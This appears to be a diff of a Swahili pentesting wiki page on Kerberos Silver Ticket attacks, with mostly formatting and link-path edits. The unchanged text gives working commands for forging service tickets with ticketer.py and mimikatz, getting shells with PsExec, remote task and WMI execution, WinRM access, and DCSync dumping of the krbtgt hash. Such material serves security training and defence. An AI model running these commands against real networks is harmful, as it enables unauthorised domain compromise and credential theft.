@@ -1,4 +1,4 @@
-# Tiketi ya Fedha
+# Silver Ticket
 
 <details>
 
@@ -27,12 +27,15 @@ Shambulio la **Tiketi ya Fedha** linahusisha kutumia tiketi za huduma katika maz
 Kwa kutengeneza tiketi, zana tofauti hutumiwa kulingana na mfumo wa uendeshaji:
 
 ### Kwenye Linux
+
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
+
 ### Kwenye Windows
+
 ```bash
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
@@ -44,18 +47,19 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
+
 ## Huduma Zilizopo
 
-| Aina ya Huduma                             | Tiketi za Fedha za Huduma                                                |
-| ------------------------------------------ | -------------------------------------------------------------------------- |
-| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Kulingana na OS pia:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Katika baadhi ya matukio unaweza tu kuomba: WINRM</p> |
-| Kazi Zilizopangwa                          | HOST                                                                       |
-| Kushiriki Faili za Windows, pia psexec     | CIFS                                                                       |
-| Operesheni za LDAP, pamoja na DCSync       | LDAP                                                                       |
-| Zana za Usimamizi wa Seva ya Mbali ya Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
-| Tiketi za Dhahabu                          | krbtgt                                                                     |
+| Aina ya Huduma                                | Tiketi za Fedha za Huduma                                                      |
+| --------------------------------------------- | ------------------------------------------------------------------------------ |
+| WMI                                           | <p>HOST</p><p>RPCSS</p>                                                        |
+| PowerShell Remoting                           | <p>HOST</p><p>HTTP</p><p>Kulingana na OS pia:</p><p>WSMAN</p><p>RPCSS</p>      |
+| WinRM                                         | <p>HOST</p><p>HTTP</p><p>Katika baadhi ya matukio unaweza tu kuomba: WINRM</p> |
+| Kazi Zilizopangwa                             | HOST                                                                           |
+| Kushiriki Faili za Windows, pia psexec        | CIFS                                                                           |
+| Operesheni za LDAP, pamoja na DCSync          | LDAP                                                                           |
+| Zana za Usimamizi wa Seva ya Mbali ya Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                             |
+| Tiketi za Dhahabu                             | krbtgt                                                                         |
 
 Kutumia **Rubeus** unaweza **kuomba zote** tiketi hizi kwa kutumia parameter:
 
@@ -74,14 +78,17 @@ Katika mifano ifuatayo fikiria kuwa tiketi imerudishwa ukiiga akaunti ya msimami
 ### CIFS
 
 Kwa tiketi hii utaweza kufikia folda za `C$` na `ADMIN$` kupitia **SMB** (ikiwa zimefunuliwa) na kunakili faili kwenye sehemu ya mfumo wa mbali kwa kufanya kitu kama:
+
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
+
 ### MHUDUMA
 
 Kwa idhini hii unaweza kuzalisha kazi zilizopangwa kwenye kompyuta za mbali na kutekeleza amri za kupindukia:
+
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -93,9 +100,11 @@ schtasks /query /S some.vuln.pc
 #Run created schtask now
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
+
 ### MHUDUMA + RPCSS
 
 Kwa tiketi hizi unaweza **kutekeleza WMI katika mfumo wa mwathiriwa**:
+
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -105,22 +114,25 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
+
 Pata **maelezo zaidi kuhusu wmiexec** katika ukurasa ufuatao:
 
-{% content-ref url="../ntlm/wmicexec.md" %}
-[wmicexec.md](../ntlm/wmicexec.md)
+{% content-ref url="../lateral-movement/wmicexec.md" %}
+[wmicexec.md](../lateral-movement/wmicexec.md)
 {% endcontent-ref %}
 
 ### HOST + WSMAN (WINRM)
 
 Ukiwa na ufikiaji wa winrm kwenye kompyuta unaweza **kuifikia** na hata kupata PowerShell:
+
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
+
 Angalia ukurasa ufuatao kujifunza **njia zaidi za kuunganisha na mwenyeji wa mbali kwa kutumia winrm**:
 
-{% content-ref url="../ntlm/winrm.md" %}
-[winrm.md](../ntlm/winrm.md)
+{% content-ref url="../lateral-movement/winrm.md" %}
+[winrm.md](../lateral-movement/winrm.md)
 {% endcontent-ref %}
 
 {% hint style="warning" %}
@@ -130,9 +142,11 @@ Tafadhali kumbuka kwamba **winrm lazima iwe hai na isikilize** kwenye kompyuta y
 ### LDAP
 
 Kwa haki hii unaweza kudump database ya DC kwa kutumia **DCSync**:
+
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
+
 **Jifunze zaidi kuhusu DCSync** kwenye ukurasa ufuatao:
 
 ## Marejeo
